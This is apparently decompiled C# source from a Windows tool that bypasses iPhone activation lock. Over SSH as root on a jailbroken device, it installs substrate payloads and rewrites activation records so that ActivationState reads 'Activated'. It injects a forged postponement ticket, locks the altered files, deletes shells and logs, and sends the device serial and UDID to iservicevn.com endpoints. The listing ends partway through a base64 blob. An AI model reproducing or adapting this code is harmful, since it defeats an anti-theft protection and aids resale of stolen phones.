		ExecuteSshCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
		ExecuteSshCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_009b_Name()
	{
		ExecuteSshCommand("chflags nouchg " + Recovered_04_004d_Name + " && rm " + Recovered_04_004d_Name);
		ExecuteSshCommand("chflags nouchg " + Recovered_04_004e_Name + " && rm " + Recovered_04_004e_Name + " && chflags nouchg " + Recovered_04_004f_Name + " && rm " + Recovered_04_004f_Name + " && chflags nouchg " + Recovered_04_0050_Name + " && rm " + Recovered_04_0050_Name + " && chflags nouchg " + Recovered_04_0051_Name + " && rm " + Recovered_04_0051_Name);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_009c_Name(string P_0, string P_1)
	{
		try
		{
			if (!Recovered_04_0043_Name.IsConnected)
			{
				Recovered_04_0043_Name.Connect();
			}
			Recovered_04_0043_Name.Upload(new FileInfo(P_0), P_1);
			return true;
		}
		catch (Exception)
		{
			throw new ApplicationException("Error Upload Resource File");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_009d_Name()
	{
		Recovered_06_009c_Name(Recovered_04_0068_Name, "/uikit.tar");
		ExecuteSshCommand("cd / && tar -xvf uikit.tar && chmod 755 /usr/bin/*");
		Recovered_06_009c_Name(Recovered_04_0069_Name, "/boot.tar.lzma");
		Recovered_06_009c_Name(Recovered_04_006a_Name, "/sbin/lzma");
		ExecuteSshCommand("chmod 777 /sbin/lzma");
		ExecuteSshCommand("lzma -d -v /boot.tar.lzma");
		ExecuteSshCommand("tar -C / -xvf /boot.tar && rm -r /boot.tar");
		ExecuteSshCommand("chmod +x /usr/libexec/substrate && /usr/libexec/substrate");
		ExecuteSshCommand("chmod +x /usr/libexec/substrated && /usr/libexec/substrated");
		ExecuteSshCommand("killall - 9 backboardd");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_009e_Name()
	{
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0010_Name, "/sbin/lzma");
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000f_Name, "/lib.tar");
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0017_Name, "/foo.tar.lzma");
		ExecuteSshCommand("tar -xvf /lib.tar -C / && chmod 777 /sbin/lzma && lzma -d -v /foo.tar.lzma && tar -xvf /foo.tar -C /");
		ExecuteSshCommand("/usr/libexec/substrate");
		ExecuteSshCommand("rm /sbin/lzma && rm /lib.tar && rm /foo.tar && rm /foo.tar.lzma");
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0003_Name, "/Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib");
		UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0004_Name, "/Library/MobileSubstrate/DynamicLibraries/iuntethered.plist");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool UploadResourceViaScp(byte[] P_0, string P_1)
	{
		try
		{
			if (!Recovered_04_0043_Name.IsConnected)
			{
				Recovered_04_0043_Name.Connect();
			}
			MemoryStream source = new MemoryStream(P_0);
			Recovered_04_0043_Name.Upload(source, P_1);
			return true;
		}
		catch (Exception)
		{
			throw new ApplicationException("Error Upload Resource File");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ConnectSshOverUsb()
	{
		while (true)
		{
			Recovered_06_0095_Name();
			Thread.Sleep(2000);
			using (Process process = new Process())
			{
				process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\iproxy.exe";
				process.StartInfo.Arguments = Recovered_04_0046_Name + " 44";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
			}
			try
			{
				AuthenticationMethod[] authenticationMethods = new AuthenticationMethod[1]
				{
					new PasswordAuthenticationMethod("root", Recovered_04_0045_Name)
				};
				ConnectionInfo connectionInfo = new ConnectionInfo(Recovered_04_0044_Name, Recovered_04_0046_Name, "root", authenticationMethods);
				connectionInfo.Timeout = TimeSpan.FromSeconds(300.0);
				Recovered_04_0042_Name = new SshClient(connectionInfo);
				Recovered_04_0042_Name.Connect();
			}
			catch
			{
				MessageBoxButtons buttons = MessageBoxButtons.YesNo;
				if (MessageBox.Show("SSH Connection Error. Please Jailbreak Again with Checkra1n 0.12.4!", "Warning!", buttons) == DialogResult.Yes)
				{
					continue;
				}
				throw new ApplicationException("Error SSH");
			}
			break;
		}
		Recovered_06_00a1_Name();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a1_Name()
	{
		AuthenticationMethod[] authenticationMethods = new AuthenticationMethod[1]
		{
			new PasswordAuthenticationMethod("root", Recovered_04_0045_Name)
		};
		ConnectionInfo connectionInfo = new ConnectionInfo(Recovered_04_0044_Name, Recovered_04_0046_Name, "root", authenticationMethods);
		connectionInfo.Timeout = TimeSpan.FromSeconds(300.0);
		Recovered_04_0042_Name = new SshClient(connectionInfo);
		Recovered_04_0043_Name = new ScpClient(connectionInfo);
		if (!Recovered_04_0042_Name.IsConnected)
		{
			Recovered_04_0042_Name.Connect();
		}
		if (!Recovered_04_0043_Name.IsConnected)
		{
			Recovered_04_0043_Name.Connect();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void MountDeviceFilesystem()
	{
		ExecuteSshCommand("mount -o rw,union,update /");
		ExecuteSshCommand("echo \"\" >> /.mount_rw");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a3_Name()
	{
		SshClient sshClient = new SshClient("127.0.0.1", "root", "alpine");
		try
		{
			if (!sshClient.IsConnected)
			{
				sshClient.Connect();
			}
			sshClient.CreateCommand("key=$(cat /./Library/Preferences/SystemConfiguration/com.apple.radios.plist); if test -z $key; then plutil -create /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; plutil -AirPlaneMode -1 /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; plutil -binary /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; chflags uchg /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; else plutil -AirPlaneMode -remove /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; plutil -AirPlaneMode -1 /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; chflags uchg /./Library/Preferences/SystemConfiguration/com.apple.radios.plist; fi ").Execute();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "ERROR");
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a4_Name()
	{
		ExecuteSshCommand("rm -f /usr/bin/ldrestart");
		ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib && rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.plist");
		ExecuteSshCommand("rm -rf /Library/MobileSubstrate/DynamicLibraries/");
		ExecuteSshCommand("rm -rf /Library/Frameworks/CydiaSubstrate.framework");
		ExecuteSshCommand("rm /Library/MobileSubstrate/MobileSubstrate.dylib");
		ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries && rm /Library/MobileSubstrate/ServerPlugins");
		ExecuteSshCommand("rm /usr/bin/cycc && rm /usr/bin/cynject");
		ExecuteSshCommand("rm /usr/include/substrate.h");
		ExecuteSshCommand("rm /usr/lib/cycript0.9/com/saurik/substrate/MS.cy");
		ExecuteSshCommand("rm -rf /usr/lib/substrate");
		ExecuteSshCommand("rm /usr/lib/libsubstrate.dylib");
		ExecuteSshCommand("rm /usr/libexec/substrate && rm /usr/libexec/substrated");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a5_Name()
	{
		ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib && rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.plist");
		ExecuteSshCommand("rm -rf /Library/MobileSubstrate/DynamicLibraries/");
		ExecuteSshCommand("rm -rf /Library/Frameworks/CydiaSubstrate.framework");
		ExecuteSshCommand("rm /Library/MobileSubstrate/MobileSubstrate.dylib");
		ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries && rm /Library/MobileSubstrate/ServerPlugins");
		ExecuteSshCommand("rm /usr/bin/cycc && rm /usr/bin/cynject");
		ExecuteSshCommand("rm /usr/include/substrate.h");
		ExecuteSshCommand("rm /usr/lib/cycript0.9/com/saurik/substrate/MS.cy");
		ExecuteSshCommand("rm -rf /usr/lib/substrate");
		ExecuteSshCommand("rm /usr/lib/libsubstrate.dylib");
		ExecuteSshCommand("rm /usr/libexec/substrate && rm /usr/libexec/substrated");
		ExecuteSshCommand("rm /bin/bash");
		ExecuteSshCommand("rm /bin/sh");
		ExecuteSshCommand("rm /bin/sed");
		ExecuteSshCommand("rm -rf /etc/apt/");
		ExecuteSshCommand("rm -rf /usr/include/");
		ExecuteSshCommand("rm -rf /private/var/empty/");
		ExecuteSshCommand("rm -rf /private/var/log/*");
		ExecuteSshCommand("rm -f /usr/bin/ldrestart");
		ExecuteSshCommand("rm /usr/bin/cycript");
		ExecuteSshCommand("rm /usr/lib/libreadline.5.2.dylib");
		ExecuteSshCommand("rm /usr/lib/libreadline.5.dylib");
		ExecuteSshCommand("rm /usr/lib/libreadline.6.0.dylib");
		ExecuteSshCommand("rm /usr/lib/libreadline.dylib");
		ExecuteSshCommand("rm /usr/lib/libcurses.dylib");
		ExecuteSshCommand("rm /usr/lib/libcycript.0.dylib");
		ExecuteSshCommand("rm /usr/lib/libcycript.cy");
		ExecuteSshCommand("rm /usr/lib/libcycript.db");
		ExecuteSshCommand("rm /usr/lib/libcycript.dylib");
		ExecuteSshCommand("rm /usr/lib/libcycript.jar");
		ExecuteSshCommand("rm /usr/lib/libform.dylib");
		ExecuteSshCommand("rm /usr/lib/libformw.dylib");
		ExecuteSshCommand("rm /usr/lib/libhistory.5.2.dylib");
		ExecuteSshCommand("rm /usr/lib/libhistory.5.dylib");
		ExecuteSshCommand("rm /usr/lib/libhistory.6.0.dylib");
		ExecuteSshCommand("rm /usr/lib/libhistory.dylib");
		ExecuteSshCommand("rm /usr/lib/libncurses.5.dylib");
		ExecuteSshCommand("rm /usr/lib/libncurses.dylib");
		ExecuteSshCommand("rm /usr/lib/libncursesw.5.dylib");
		ExecuteSshCommand("rm /usr/lib/libncursesw.dylib");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a6_Name()
	{
		ExecuteSshCommand("rm " + Recovered_04_0056_Name);
		ExecuteSshCommand("mkdir " + Recovered_04_0056_Name + " && chown -R mobile:mobile " + Recovered_04_0056_Name + " && chmod -R 755 " + Recovered_04_0056_Name);
		UpdateProgress(58);
		Recovered_06_00ac_Name(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist", 2);
		ExecuteSshCommand("chflags nouchg " + Recovered_04_004e_Name + " && mkdir -p " + Recovered_04_004b_Name);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist", Recovered_04_0056_Name + "/Route_CommCe.plist");
		UpdateProgress(59);
		ExecuteSshCommand("mv -f " + Recovered_04_0056_Name + "/Route_CommCe.plist " + Recovered_04_004e_Name);
		ExecuteSshCommand("chown root:mobile " + Recovered_04_004e_Name + " && chmod 555 " + Recovered_04_004e_Name + " && chflags uchg " + Recovered_04_004e_Name);
		UpdateProgress(60);
		ExecuteSshCommand("mkdir -p " + Recovered_04_0049_Name + " && chmod 775 " + Recovered_04_0049_Name);
		Recovered_06_00ac_Name(Recovered_04_0053_Name + "activation_record.plist", 2);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "activation_record.plist", Recovered_04_0056_Name + "/Route_ActRec.plist");
		ExecuteSshCommand("mv -f " + Recovered_04_0056_Name + "/Route_ActRec.plist " + Recovered_04_004d_Name + " && chflags uchg " + Recovered_04_004d_Name);
		UpdateProgress(62);
		Recovered_06_00ac_Name(Recovered_04_0053_Name + "data_ark.plist", 2);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "data_ark.plist", Recovered_04_0056_Name + "/Route_DataArk.plist");
		UpdateProgress(64);
		ExecuteSshCommand("cp -f " + Recovered_04_0056_Name + "/Route_DataArk.plist " + Recovered_04_0050_Name + " && mv -f " + Recovered_04_0056_Name + "/Route_DataArk.plist " + Recovered_04_004f_Name + " && chflags uchg " + Recovered_04_0050_Name + " && chflags uchg " + Recovered_04_004f_Name);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00a7_Name()
	{
		ExecuteSshCommand("rm -rf " + Recovered_04_0056_Name);
		ExecuteSshCommand("mkdir -p " + Recovered_04_0056_Name + " && chmod -R 755 " + Recovered_04_0056_Name);
		UpdateProgress(58);
		ExecuteSshCommand("mkdir -p " + Recovered_04_004b_Name + " && chmod 775 " + Recovered_04_004b_Name);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist", Recovered_04_0056_Name + "/Route_CommCe.plist");
		ExecuteSshCommand("mv -f " + Recovered_04_0056_Name + "/Route_CommCe.plist " + Recovered_04_004e_Name + " && chflags uchg " + Recovered_04_004e_Name);
		ExecuteSshCommand("mkdir -p " + Recovered_04_0049_Name + " && chmod 775 " + Recovered_04_0049_Name);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "activation_record.plist", Recovered_04_0056_Name + "/Route_ActRec.plist");
		ExecuteSshCommand("mv -f " + Recovered_04_0056_Name + "/Route_ActRec.plist " + Recovered_04_004d_Name + " && chflags uchg " + Recovered_04_004d_Name);
		UpdateProgress(62);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "data_ark.plist", Recovered_04_0056_Name + "/Route_DataArk.plist");
		UpdateProgress(64);
		ExecuteSshCommand("cp -f " + Recovered_04_0056_Name + "/Route_DataArk.plist " + Recovered_04_0050_Name + " && mv -f " + Recovered_04_0056_Name + "/Route_DataArk.plist " + Recovered_04_004f_Name + " && chflags uchg " + Recovered_04_0050_Name + " && chflags uchg " + Recovered_04_004f_Name);
		Recovered_06_00b3_Name(Recovered_04_0053_Name + "RaptorActivation.pem", Recovered_04_0056_Name + "/RaptorActivation.pem");
		ExecuteSshCommand("mv -f " + Recovered_04_0056_Name + "/RaptorActivation.pem/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_00a8_Name()
	{
		try
		{
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			string requestUriString = "http://iservicevn.com/tmgsm/dractivation.php?serialNumber=" + deviceSerialNumber;
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_00a9_Name()
	{
		try
		{
			string requestUriString = "http://iservicevn.com/UploadSRV.php";
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Recovered_06_00aa_Name()
	{
		try
		{
			string deviceUDID = DeviceStateRecovered.DeviceUDID;
			string requestUriString = "http://fmi.iservicevn.com/fmio/xPet.php?udid=" + deviceUDID + "&sn=" + DeviceStateRecovered.DeviceSerialNumber;
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_00ab_Name()
	{
		Recovered_06_00b3_Name(Recovered_04_0054_Name + "plutil_iphone", "/usr/bin/plutil");
		ExecuteSshCommand("chflags -R nouchg " + Recovered_04_0050_Name);
		ExecuteSshCommand("chflags -R nouchg " + Recovered_04_004f_Name);
		ExecuteSshCommand("chmod 755 /usr/bin/plutil");
		UpdateProgress(2);
		ExecuteSshCommand("plutil -key ActivationState -remove " + Recovered_04_0050_Name);
		ExecuteSshCommand("plutil -key -ActivationState -remove " + Recovered_04_0050_Name);
		ExecuteSshCommand("plutil -key -UCRTOOBForbidden -remove " + Recovered_04_0050_Name);
		ExecuteSshCommand("plutil -key ActivationState -string Activated " + Recovered_04_0050_Name);
		ExecuteSshCommand("chflags uchg " + Recovered_04_0050_Name);
		ExecuteSshCommand("cp " + Recovered_04_0050_Name + " " + Recovered_04_004f_Name);
		ExecuteSshCommand("chflags uchg " + Recovered_04_004f_Name);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool Recovered_06_00ac_Name(string P_0, int P_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\win-plutil.exe";
			if (P_1 == 1)
			{
				string text = $"\"{P_0}\"";
				processStartInfo.Arguments = "-convert xml1 " + text;
				process.StartInfo = processStartInfo;
				process.Start();
				process.WaitForExit();
				return true;
			}
			string text2 = $"\"{P_0}\"";
			processStartInfo.Arguments = "-convert binary1 " + text2;
			process.StartInfo = processStartInfo;
			process.Start();
			process.WaitForExit();
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
			throw new ApplicationException("Error(5)" + P_0 + " " + P_1);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00ad_Name()
	{
		try
		{
			ExecuteSshCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs");
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00ae_Name()
	{
		try
		{
			ExecuteSshCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs");
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00af_Name()
	{
		ExecuteSshCommand("launchctl unload -F /System/Library/LaunchDaemons/* && launchctl load -w -F /System/Library/LaunchDaemons/*");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public SshCommand ExecuteSshCommand(string P_0)
	{
		if (!Recovered_04_0042_Name.IsConnected)
		{
			Recovered_04_0042_Name.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			Recovered_04_0042_Name.Connect();
		}
		try
		{
			SshCommand sshCommand = Recovered_04_0042_Name.CreateCommand(P_0);
			IAsyncResult asyncResult = sshCommand.BeginExecute();
			while (!asyncResult.IsCompleted)
			{
				Thread.Sleep(1000);
			}
			string text = sshCommand.EndExecute(asyncResult);
			if (Recovered_04_005e_Name)
			{
				Console.WriteLine("===========================================");
				Console.WriteLine("Command Name = {0} " + sshCommand.CommandText);
				Console.WriteLine("Return Value = {0}", sshCommand.ExitStatus);
				Console.WriteLine("Error = {0}", sshCommand.Error);
				Console.WriteLine("Result = {0}", sshCommand.Result);
			}
			return sshCommand;
		}
		catch
		{
			if (!(P_0 == "ls") && !(P_0 == "uicache --all"))
			{
				if (Recovered_04_005e_Name)
				{
					Console.WriteLine("SSH Error caused by:" + P_0);
				}
				else
				{
					Thread.Sleep(2000);
				}
				Recovered_06_0094_Name();
				ExecuteSshCommand(P_0);
			}
			return null;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b1_Name()
	{
		if (!Recovered_04_0042_Name.IsConnected)
		{
			Recovered_04_0042_Name.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			Recovered_04_0042_Name.Connect();
		}
		try
		{
			Recovered_04_0042_Name.CreateCommand("ldrestart").Execute();
			Thread.Sleep(10000);
			Recovered_04_0042_Name.Disconnect();
		}
		catch
		{
		}
		Recovered_06_0094_Name();
		Thread.Sleep(1000);
	}

	public void Recovered_06_00b2_Name()
	{
		Thread.Sleep(11000);
	}

	public void Recovered_06_00b3_Name(string P_0, string P_1)
	{
		Stream stream = File.Open(P_0, FileMode.Open);
		Stream stream2 = stream;
		Recovered_04_0043_Name.Upload(stream2, P_1);
		stream2.Close();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b4_Name()
	{
		using (Process process = new Process())
		{
			process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\ideviceactivation.exe";
			process.StartInfo.Arguments = "deactivate";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardOutput.ReadToEnd();
			process.WaitForExit();
		}
		Recovered_06_009a_Name();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b5_Name()
	{
		string text = Recovered_06_00bd_Name();
		text = text.ToString().Replace("\n", "").Replace("\r", "")
			.Replace("\t", "");
		File.WriteAllText(Recovered_04_0053_Name + "act_rec.plist.tmp", text);
		NSDictionary nSDictionary = (NSDictionary)PropertyListParser.Parse(new FileInfo(Recovered_04_0053_Name + "act_rec.plist.tmp"));
		Recovered_04_005f_Name = Recovered_06_00be_Name(nSDictionary, "WildcardTicketToRemove");
		nSDictionary.Remove("WildcardTicketToRemove");
		PropertyListParser.SaveAsXml(nSDictionary, new FileInfo(Recovered_04_0053_Name + "activation_record.plist"));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b6_Name()
	{
		NSDictionary nSDictionary = (NSDictionary)PropertyListParser.Parse(new FileInfo(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist"));
		try
		{
			nSDictionary.Remove("kPostponementTicket");
		}
		catch
		{
		}
		nSDictionary.Add("kPostponementTicket", new NSDictionary
		{
			{ "ActivationState", "Activated" },
			{ "ActivationTicket", Recovered_04_005f_Name },
			{ "ActivityURL", "https://albert.apple.com/deviceservices/activity" },
			{ "PhoneNumberNotificationURL", "https://albert.apple.com/deviceservices/phoneHome" }
		});
		PropertyListParser.SaveAsXml(nSDictionary, new FileInfo(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist"));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_00b7_Name()
	{
		NSDictionary nSDictionary = (NSDictionary)PropertyListParser.Parse(new FileInfo(Recovered_04_0053_Name + "com.apple.commcenter.device_specific_nobackup.plist"));
		string obj = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+QWN0aXZhdGlvblJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SYW5kb21uZXNzPC9rZXk+CgkJPHN0cmluZz4zMGI2MGZkMC02Njc0LTQ3NzgtYmIxNC1mNGZhOTQ0MWQ0Yzg8L3N0cmluZz4KCQk8a2V5PkFjdGl2YXRpb25TdGF0ZTwva2V5PgoJCTxzdHJpbmc+VW5hY3RpdmF0ZWQ8L3N0cmluZz4KCQk8a2V5PkZNaVBBY2NvdW50RXhpc3RzPC9rZXk+CgkJPHRydWUvPgoJPC9kaWN0PgoJPGtleT5CYXNlYmFuZFJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SZXF1aXJlc0FjdGl2YXRpb25UaWNrZXQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5CYXNlYmFuZEFjdGl2YXRpb25UaWNrZXRWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz5WMjwvc3RyaW5nPgoJCTxrZXk+QmFzZWJhbmRDaGlwSUQ8L2tleT4KCQk8aW50ZWdlcj4xMjM0NTY3PC9pbnRlZ2VyPgoJCTxrZXk+QmFzZWJhbmRNYXN0ZXJLZXlIYXNoPC9rZXk+CgkJPHN0cmluZz44Q0IxMDcwRDk1QjlDRUU0QzgwMDAwNUUyMTk5QkI4RkIxODNCMDI3MTNBNTJEQjVFNzVDQTJBNjE1NTM2MTgyPC9zdHJpbmc+CgkJPGtleT5CYXNlYmFuZFNlcmlhbE51bWJlcjwva2V5PgoJCTxkYXRhPgoJCUVnaGRDdz09CgkJPC9kYXRhPgoJCTxrZXk+SW50ZXJuYXRpb25hbE1vYmlsZUVxdWlwbWVudElkZW50aXR5PC9rZXk+CgkJPHN0cmluZz4xMjM0NTY3ODkxMjM0NTY8L3N0cmluZz4KCQk8a2V5Pk1vYmlsZUVxdWlwbWVudElkZW50aWZpZXI8L2tleT4KCQk8c3RyaW5nPjEyMzQ1Njc4OTEyMzQ1PC9zdHJpbmc+CgkJPGtleT5TSU1TdGF0dXM8L2tleT4KCQk8c3RyaW5nPmtDVFNJTVN1cHBvcnRTSU1TdGF0dXNOb3RJbnNlcnRlZDwvc3RyaW5nPgoJCTxrZXk+U3VwcG9ydHNQb3N0cG9uZW1lbnQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvUFJMTmFtZTwva2V5PgoJCTxpbnRlZ2VyPjA8L2ludGVnZXI+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvU2VydmljZVByb3Zpc2lvbmluZ1N0YXRlPC9rZXk+CgkJPGZhbHNlLz4KCTwvZGljdD4KCTxrZXk+RGV2aWNlQ2VydFJlcXVlc3Q8L2tleT4KCTxkYXRhPgoJTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTQlNSVkZWUlZOVUxTMHRMUzBLVFVsSlFuaEVRME5CVXpCRFFWRkIKCWQyZFpUWGhNVkVGeVFtZE9Wa0pCVFZSS1JVa3pUbXRSTUU1RlJUVk1WVmt6VGpCUmRFNUZVVEJOYVRBMFVWVktRZzBLCglURlJyZUZKcVdrVlNSRWw1VWtWS1IwNXFSVXhOUVd0SFFURlZSVUpvVFVOV1ZrMTRRM3BCU2tKblRsWkNRV2RVUVd0TwoJYWpaeFNVbHRUbmxXU21WMU5sTTJVak40UVcxT1RXNWFjREpHTDNoRVNIRjViVmxVT1ZoT1JFdzBjRlJaYjFnMmF6QmsKCVFrMVNTWGRGUVZsRVZsRlJTQTBLUlhkc1JHUllRbXhqYmxKd1ltMDRlRVY2UVZKQ1owNVdRa0Z2VkVOclJuZGpSM2hzCglTVVZzZFZsNU5IaEVla0ZPUW1kT1ZrSkJjMVJDYld4UllVYzVkUTBLV2xSRFFtNTZRVTVDWjJ0eGFHdHBSemwzTUVKQgoJUVUxQk1FZERVM0ZIVTBsaU0wUlJSVUpDVVZWQlFUUkhRa0ZETDJ4eWJHVlJUamR3UVEwS00yaEhWVlkwU0ZsU1lXdHYKCWFrazRPV3d4YUZKdmRqQlROREJPTUhBeU1UaHJUV295YkRGT2EzUXdWWEJxV2s5RU5WVldlVGRDT0VsT1FrSm1RMmxNCglNZzBLWnk4dkx5dHpaVVZoVjFjMGFEWXdUM0pOZG5KbFFWQTBNR0psVTJaUFlucE1WR3hYUzJGV2NXRnJNV1JGVGpSSgoJTkd4TVRYaHBlVFVyYjNwSVpqWmlWdzBLVGl0bldFSlVNMjl4WkhWRFF6RldWelZKV25aMlpFUlNWRWx3YUZoNmEyRUsKCVVVVkdRVUZQUW1wUlFYZG5XV3REWjFsRlFYSlVhMVpFZDBGV01IbHRZazVWUm14ME0yeExjMHRCWkEwS2JuYzBTRlpPCglaMEZ1UkhoaWRRMEtRVUpXV1VSMlNGaEJNREZNV0ZOS1F5dHRkamd5VFZSSWQySk5ORVF2V2xJclJFaFpRV1kyWXlzNQoJYVc1TlJtUk9PR2xaV0hSSWFFOXdjV3MwYVd4TlR3MEtZMnRuWWtsNlMwb3lOWFJPWTFKVWMwOXdWVU5CZDBWQlFXRkIKCUxTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVWdVa1ZSVlV